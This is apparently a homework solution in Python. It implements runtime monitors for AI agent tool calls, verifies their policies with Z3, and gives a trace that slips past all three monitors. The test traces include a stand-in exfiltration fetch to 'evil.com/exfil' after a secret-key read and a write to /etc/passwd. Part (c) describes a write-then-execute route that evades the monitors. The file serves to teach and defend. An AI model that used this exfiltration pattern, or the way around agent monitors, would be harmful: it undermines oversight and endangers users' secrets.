"""
CS292C Homework 2 — Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
===================================================================================
Part (a): Implement three stateful runtime monitors as DFAs.
Part (b): Verify the same properties using Z3 bounded model checking.
Part (c): Find a trace that passes all monitors but is still dangerous.
"""

from z3 import *
from dataclasses import dataclass

# ============================================================================
# Event Model
# ============================================================================

@dataclass
class ToolEvent:
    """A single tool-call event in an agent trace."""
    tool: str          # "file_read", "file_write", "shell_exec", "network_fetch"
    path: str          # target file/resource path
    is_sensitive: bool  # whether the target is sensitive

ALLOW = "ALLOW"
DENY = "DENY"


# ============================================================================
# Part (a): DFA Monitors — 8 pts
# ============================================================================

SANDBOX_DIR = "/project/"  # paths starting with this are "in sandbox"

class SandboxMonitor:
    """
    Policy: Deny any file_write where path does not start with SANDBOX_DIR.
    All other tool calls are allowed.
    Once a violation occurs, the monitor enters an absorbing rejecting state.
    """

    def __init__(self):
        # Two states: "OK" (start) and "VIOLATION" (absorbing).
        self.violated = False

    def step(self, event: ToolEvent) -> str:
        if self.violated:
            return DENY
        if event.tool == "file_write" and not event.path.startswith(SANDBOX_DIR):
            self.violated = True
            return DENY
        return ALLOW


class ReadBeforeWriteMonitor:
    """
    Policy: Deny any file_write to a path that has not been file_read first.
    State = the set of paths read so far. No absorbing state — each event is
    judged independently against the read-set.
    """

    def __init__(self):
        self.read_paths: set[str] = set()

    def step(self, event: ToolEvent) -> str:
        if event.tool == "file_read":
            self.read_paths.add(event.path)
            return ALLOW
        if event.tool == "file_write":
            return ALLOW if event.path in self.read_paths else DENY
        return ALLOW


class NoExfilMonitor:
    """
    Policy: After any file_read of a sensitive resource, deny ALL subsequent
    network_fetch calls. Two states: CLEAN → TAINTED (absorbing for the
    purposes of network_fetch denial).
    """

    def __init__(self):
        self.tainted = False

    def step(self, event: ToolEvent) -> str:
        if event.tool == "file_read" and event.is_sensitive:
            self.tainted = True
            return ALLOW   # the read itself is allowed
        if event.tool == "network_fetch" and self.tainted:
            return DENY
        return ALLOW


class ComposedMonitor:
    """Runs all three monitors in parallel. Denies if ANY monitor denies."""

    def __init__(self):
        self.monitors = [SandboxMonitor(), ReadBeforeWriteMonitor(), NoExfilMonitor()]

    def step(self, event: ToolEvent) -> str:
        results = [m.step(event) for m in self.monitors]
        return DENY if DENY in results else ALLOW


# ============================================================================
# Part (a) continued: Test traces
# ============================================================================

def test_monitors():
    """Test the monitors on example traces."""

    print("=== Part (a): DFA Monitor Tests ===\n")

    # Trace 1: Should be fully allowed
    trace1 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/project/src/main.py", False),
        ToolEvent("shell_exec", "/project/run_tests.sh", False),
    ]

    # Trace 2: Should be denied by SandboxMonitor (write outside sandbox)
    trace2 = [
        ToolEvent("file_read",  "/project/src/main.py", False),
        ToolEvent("file_write", "/etc/passwd", False),  # ← violation
    ]

    # Trace 3: Should be denied by ReadBeforeWriteMonitor (write without read)
    trace3 = [
        ToolEvent("file_write", "/project/src/new_file.py", False),  # ← no prior read
    ]

    # Trace 4: Should be denied by NoExfilMonitor (network after sensitive read)
    trace4 = [
        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive!
        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # ← denied
    ]

    for i, (trace, name) in enumerate([(trace1, "clean"), (trace2, "sandbox violation"),
                                        (trace3, "write-before-read"), (trace4, "exfiltration")], 1):
        cm = ComposedMonitor()
        results = []
        for event in trace:
            r = cm.step(event)
            results.append(r)

        print(f"  Trace {i} ({name}):")
        for event, r in zip(trace, results):
            print(f"    {event.tool:16s} {event.path:40s} → {r}")
        denied = any(r == DENY for r in results)
        print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")


# ============================================================================
# Part (b): Bounded Trace Verification with Z3 — 8 pts
# ============================================================================

FILE_READ = 0
FILE_WRITE = 1
SHELL_EXEC = 2
NETWORK_FETCH = 3

def make_symbolic_trace(K):
    """Create symbolic trace variables for K steps."""
    tool = [Int(f"tool_{i}") for i in range(K)]
    in_sandbox = [Bool(f"in_sandbox_{i}") for i in range(K)]
    is_sensitive = [Bool(f"is_sensitive_{i}") for i in range(K)]
    path_id = [Int(f"path_{i}") for i in range(K)]

    wf = []
    for i in range(K):
        wf.append(And(tool[i] >= 0, tool[i] <= 3))
        wf.append(And(path_id[i] >= 0, path_id[i] <= 9))

    return {'tool': tool, 'in_sandbox': in_sandbox,
            'is_sensitive': is_sensitive, 'path_id': path_id, 'K': K}, wf


def verify_property_bounded(name, K, prop_negation_fn):
    """
    Check if a property can be violated in any trace of length K.
    prop_negation_fn(trace) should return constraints asserting a violation exists.
    """
    trace, wf = make_symbolic_trace(K)
    s = Solver()
    s.add(wf)
    s.add(prop_negation_fn(trace))

    result = s.check()
    print(f"  {name} (K={K}): ", end="")
    if result == sat:
        m = s.model()
        print("VIOLATION FOUND:")
        for i in range(K):
            t = m.eval(trace['tool'][i]).as_long()
            names = {0: "file_read", 1: "file_write", 2: "shell_exec", 3: "net_fetch"}
            p = m.eval(trace['path_id'][i])
            sb = m.eval(trace['in_sandbox'][i], model_completion=True)
            se = m.eval(trace['is_sensitive'][i], model_completion=True)
            print(f"    step {i}: {names.get(t, '?'):12s} path={p} sandbox={sb} sensitive={se}")
    else:
        print("NO VIOLATION POSSIBLE (property holds for all traces)")
    print()


def part_b():
    """For each property, encode the NEGATION and use Z3 to find a violator."""
    K = 8
    print(f"=== Part (b): Bounded Trace Verification (K={K}) ===\n")

    # ---- Property 1: every file_write is in sandbox ----
    # Negation: ∃ i. tool[i] == FILE_WRITE ∧ ¬in_sandbox[i].
    def negate_sandbox(trace):
        K = trace['K']
        return Or([
            And(trace['tool'][i] == FILE_WRITE,
                Not(trace['in_sandbox'][i]))
            for i in range(K)
        ])

    # ---- Property 2: every file_write must have a prior matching file_read ----
    # Negation: ∃ j. tool[j] == FILE_WRITE ∧ ∀ i < j.
    #             (tool[i] != FILE_READ ∨ path_id[i] != path_id[j]).
    def negate_read_before_write(trace):
        K = trace['K']
        clauses = []
        for j in range(K):
            no_prior_read = And([
                Or(trace['tool'][i] != FILE_READ,
                   trace['path_id'][i] != trace['path_id'][j])
                for i in range(j)
            ]) if j > 0 else BoolVal(True)
            clauses.append(And(trace['tool'][j] == FILE_WRITE, no_prior_read))
        return Or(clauses)

    # ---- Property 3: a sensitive file_read taints all later network_fetches ----
    # Negation: ∃ i < j. tool[i] == FILE_READ ∧ is_sensitive[i]
    #                  ∧ tool[j] == NETWORK_FETCH.
    def negate_no_exfil(trace):
        K = trace['K']
        return Or([
            And(trace['tool'][i] == FILE_READ,
                trace['is_sensitive'][i],
                trace['tool'][j] == NETWORK_FETCH)
            for i in range(K) for j in range(i + 1, K)
        ])

    verify_property_bounded("Sandbox", K, negate_sandbox)
    verify_property_bounded("Read-before-write", K, negate_read_before_write)
    verify_property_bounded("No-exfiltration", K, negate_no_exfil)

    # [EXPLAIN] DFA monitor vs Z3 bounded approach:
    #   * DFA monitors run online over the *actual* event stream — they
    #     observe concrete paths, real timestamps and real `is_sensitive`
    #     classifications, and they can keep arbitrarily large state
    #     (e.g. an unbounded read-set). They cannot answer "could this
    #     ever happen?" — they only report on the trace they see.
    #   * The Z3 bounded approach quantifies over ALL traces of length ≤ K.
    #     It can prove the absence of any violating trace within that bound,
    #     or produce a concrete counterexample. But it abstracts the world
    #     (paths become small integer IDs, sensitivity is a free Boolean,
    #     contents are unmodeled) and the proof only holds up to the bound;
    #     longer traces or properties about content-flow that aren't in the
    #     encoding are not covered.
    #   In short: DFA monitors catch real-time violations of the policy as
    #   coded; Z3 bounded checking catches policy-design holes (gaps in the
    #   policy itself) within a finite horizon, but at a coarser semantic
    #   resolution than runtime monitoring.


# ============================================================================
# Part (c): Monitor Completeness — 4 pts
# ============================================================================

def part_c():
    """
    A 6-step trace that all three monitors accept but that is still dangerous:
    a write-then-execute (self-modification) attack.

    The agent reads a script in the sandbox, then writes (modifies) that
    script, reads it again, and finally executes it via shell_exec. From the
    monitors' perspective everything looks fine, but in reality the agent has
    just run a script whose contents it authored — classic privilege
    laundering / self-modifying code.
    """
    print("=== Part (c): Monitor Completeness ===\n")

    trace = [
        # (1) routine read
        ToolEvent("file_read",  "/project/src/main.py",   False),
        # (2) read of the helper script we are going to mutate
        ToolEvent("file_read",  "/project/run.sh",        False),
        # (3) self-modification: rewrite run.sh with attacker-chosen content
        ToolEvent("file_write", "/project/run.sh",        False),
        # (4) re-read the now-modified script (also satisfies any "read first" check)
        ToolEvent("file_read",  "/project/run.sh",        False),
        # (5) routine sandbox write
        ToolEvent("file_write", "/project/src/main.py",   False),
        # (6) execute the script we just modified — the dangerous step
        ToolEvent("shell_exec", "/project/run.sh",        False),
    ]

    cm = ComposedMonitor()
    print("  Trace:")
    all_allowed = True
    for event in trace:
        r = cm.step(event)
        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} → {r}")
        if r == DENY:
            all_allowed = False

    print(f"\n  All allowed: {all_allowed}")

    # [EXPLAIN]
    # 1. Property violated: code-integrity / "no exec-after-write".
    #    The agent executes a script that it just modified. In a real system
    #    this is privilege escalation: shell_exec runs whatever the writer
    #    put there, so an attacker who controls the agent's writes also
    #    controls the executed command. (Equivalently, the monitors give
    #    no notion of "trusted code" vs "agent-written code".)
    # 2. Why the three monitors miss it:
    #      • SandboxMonitor only restricts the *path* of file_write — every
    #        write here is in /project/, so it is happy.
    #      • ReadBeforeWriteMonitor is satisfied because run.sh was read
    #        before being written; it does not care whether a write was
    #        followed by a (re-)read or by execution.
    #      • NoExfilMonitor only fires after a *sensitive* file_read; no
    #        sensitive read occurs in this trace, so no taint is raised.
    #      None of the three observe data flow from a write into a later
    #      shell_exec or network_fetch.
    # 3. Additional monitor needed: a write-then-exec / taint-propagation
    #    monitor that tracks "paths the agent has written to" and denies
    #    shell_exec (and arguably network_fetch payloads) on any path that
    #    was modified by the agent earlier in the trace. This is the dual
    #    of NoExfilMonitor for write-side taint.
    print()


# ============================================================================
if __name__ == "__main__":
    test_monitors()
    part_b()
    part_c()
